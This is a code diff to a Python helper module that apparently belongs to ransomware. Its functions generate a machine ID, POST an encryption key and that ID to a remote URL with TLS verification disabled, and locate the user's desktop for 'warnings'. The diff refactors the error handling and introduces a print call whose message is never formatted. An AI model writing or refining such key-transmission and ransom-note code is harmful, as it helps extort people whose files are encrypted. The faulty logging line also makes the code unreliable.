@@ -11,7 +11,6 @@
 """Utility functions for machine ID generation, key transmission, and desktop warnings."""
 
 import os
-import platform
 import uuid
 from pathlib import Path
 from uuid import UUID
@@ -31,14 +30,10 @@ def send_key(url: str, key: bytes, machine_id: str) -> None:
     payload = {"key": key.decode(), "machine_id": machine_id}
     try:
         response = requests.post(url, json=payload, verify=False)
-        if response.status_code != 200:
-            print(
-                f"Failed to send key.\nStatus: {response.status_code} | {response.text}"
-            )
-        else:
-            print("Key sent succesfully.")
+        response.raise_for_status()
+        print("Key sent succesfully.")
     except requests.RequestException as e:
-        print(f"Error while sending key: {e}")
+        print("Error while sending key: %s", e)
 
 
 def gen_machine_id(ns: UUID = uuid.NAMESPACE_DNS) -> str:
@@ -63,6 +58,8 @@ def get_desktop_path() -> Path:
     Returns:
         Path: Path object pointing to the user's desktop.
     """
+    import platform
+
     system = platform.system()
     if system == "Windows":
         desktop = Path(os.environ["USERPROFILE"]) / "Desktop"
